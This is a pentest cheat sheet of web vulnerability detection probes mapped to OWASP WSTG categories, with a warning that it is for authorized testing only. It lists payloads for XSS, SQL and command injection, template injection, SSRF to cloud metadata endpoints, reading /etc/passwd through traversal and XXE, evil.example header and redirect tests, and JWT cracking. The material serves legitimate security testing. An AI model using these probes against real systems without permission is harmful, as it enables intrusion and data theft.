# WSTG Detection Payloads & Probes

> **Authorized testing only.** These are canonical *detection* probes — minimal
> inputs that reveal whether a sink is exploitable, not weaponized exploits. Use
> them only against systems you own or have written permission to test. Prefer
> non-destructive probes; never run them against production data you can't restore.

Maps to WSTG-INPV / WSTG-CLNT. For deeper, vetted material see PortSwigger Web
Security Academy and the OWASP Cheat Sheet Series.

## Cross-Site Scripting (INPV-01/02, CLNT-01)

Reflected/stored canary — search the response for it rendered unencoded:
```
'"><svg onload=alert(1)>
"-prompt(1)-"
javascript:alert(1)            # in href/src sinks
```
DOM probe — trace from `location`/`document.referrer` into `innerHTML`/`eval`/`document.write`.
Confirm by reflection context (HTML body / attribute / JS / URL), not by the alert alone.

## SQL Injection (INPV-05)

Detection (boolean + error + time-blind):
```
'                              # provoke a SQL error
' OR '1'='1                    # boolean-true
' AND '1'='2                   # boolean-false (differential)
1' ORDER BY 1-- -              # column count probe
'; WAITFOR DELAY '0:0:5'-- -   # MSSQL time-blind
' || pg_sleep(5)-- -           # PostgreSQL time-blind
```
Automate safely with `sqlmap --batch --level=2 --risk=1` against authorized targets.

## NoSQL Injection (INPV-05, NoSQL variant)
```
{"$gt": ""}                    # auth bypass in JSON bodies
{"$ne": null}
```

## Command Injection (INPV-12)
```
; id
| id
$(id)
`id`
& ping -c1 <your-collaborator>     # OOB confirmation
```

## Server-Side Template Injection (INPV-18)
```
{{7*7}}        ->  49          # Jinja2/Twig
${7*7}         ->  49          # FreeMarker/Thymeleaf
#{7*7}         ->  49          # Ruby/others
<%= 7*7 %>     ->  49          # ERB
```
49 in output = engine evaluated it. Identify the engine before escalating.

## Server-Side Request Forgery (INPV-19)
```
http://169.254.169.254/latest/meta-data/    # cloud metadata (AWS)
http://metadata.google.internal/             # GCP
http://127.0.0.1:<internal-port>/
http://<your-collaborator>/                  # OOB to confirm egress
```
Watch for response-time / content differences and DNS/HTTP hits at your listener.

## Path Traversal / LFI (ATHZ-01)
```
../../../../etc/passwd
..%2f..%2f..%2fetc%2fpasswd     # URL-encoded
....//....//etc/passwd          # filter bypass
```

## Host Header Injection (INPV-17)
```
Host: evil.example
X-Forwarded-Host: evil.example
```
Check password-reset links, cache keys, and absolute URLs in the response.

## XXE (INPV-07)
```xml
<?xml version="1.0"?>
<!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]>
<r>&x;</r>
```

## Open Redirect / Reverse Tabnabbing (CLNT-04/14)
```
?next=https://evil.example
?url=//evil.example
```
Tabnabbing: any `target="_blank"` link missing `rel="noopener"`.

## CORS (CLNT-07)
```
Origin: https://evil.example
```
Vuln if response reflects that origin AND sets `Access-Control-Allow-Credentials: true`.

## JWT (SESS-10)
- `alg: none` accepted? Strip the signature and retry.
- Weak HMAC secret? Crack offline (`hashcat -m 16500`) — authorized only.
- `kid` path/SQL injection; algorithm confusion (RS256 → HS256 using the public key as the HMAC secret).
- Use `jwt_tool` to automate these checks.

## Out-of-band (OAST)
Use a collaborator listener (Burp Collaborator / interactsh) to confirm blind
SSRF, blind injection, and blind XXE without needing a visible response.

---

### Recommended tooling
Burp Suite (Community/Pro), OWASP ZAP, `sqlmap`, `nmap`, `ffuf`/`gobuster`,
`testssl.sh`/`sslyze`, `jwt_tool`, `nuclei`, interactsh, GraphQL: InQL / `graphw00f`.

### Authoritative payload/defense references
- OWASP Cheat Sheet Series — defensive controls per vuln class
- PortSwigger Web Security Academy — labs + payloads
- PayloadsAllTheThings — community payload corpus (vet before use)
